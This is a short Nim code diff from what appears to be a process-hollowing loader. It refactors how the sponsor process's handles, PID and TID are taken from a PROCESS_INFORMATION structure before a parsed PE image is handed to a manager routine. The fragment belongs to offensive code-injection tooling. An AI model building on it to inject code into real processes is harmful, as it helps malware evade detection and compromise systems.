@@ -204,8 +204,16 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
         quit(1)
 
 
-proc splittedNimlineHollowManager*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
-  
+proc splittedNimlineHollowManager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
+    
+    # Extract process information
+    let sponsorProcessHandle = sponsorProcessInfo.hProcess
+    let sponsorThreadHandle = sponsorProcessInfo.hThread
+    let sponsorPid = sponsorProcessInfo.dwProcessId
+    let sponsorTid = sponsorProcessInfo.dwThreadId
+    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
+    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
+    
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
     var peBytesPtr = addr peBytes[0]
@@ -213,15 +221,6 @@ proc splittedNimlineHollowManager*(peStr: string, processInfoAddress: PPROCESS_I
     var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
     var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     
-    # Extract process information
-    var sponsorProcessHandle: HANDLE
-    var sponsorThreadHandle: HANDLE
-    var sponsorPid: DWORD
-    var sponsorTid: DWORD
-    (sponsorProcessHandle, sponsorThreadHandle, sponsorPid, sponsorTid) = extractProcessInfo(processInfoAddress)
-    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
-    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
-
     discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)
 
  
